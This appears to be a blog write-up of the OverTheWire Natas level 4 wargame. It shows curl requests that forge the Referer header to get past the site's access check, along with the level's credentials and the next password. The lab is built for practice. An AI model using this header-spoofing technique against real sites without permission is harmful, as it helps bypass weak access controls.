---
title: "Natas Level 4"
date: 2026-02-16T15:20:00-06:00
draft: false
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas4`
- **Password:** `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
- **URL:** <http://natas4.natas.labs.overthewire.org>

```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org
```

Body:

```html
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
```

The hint is that authorized users should come only from that URL. The server is checking the **Referer** header. We can send a custom header with cURL using `-H`. For example:

```bash
curl -u user:pass URL -H "referer: URL"
```

Send the request again with the expected referer:

```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org -H "referer: http://natas5.natas.labs.overthewire.org/"
```

```html
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
```

Adding the Referer header makes the server treat us as if we came from natas5, so access is granted.

**Password for natas5:** `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

---

*More levels will be added in future posts.*
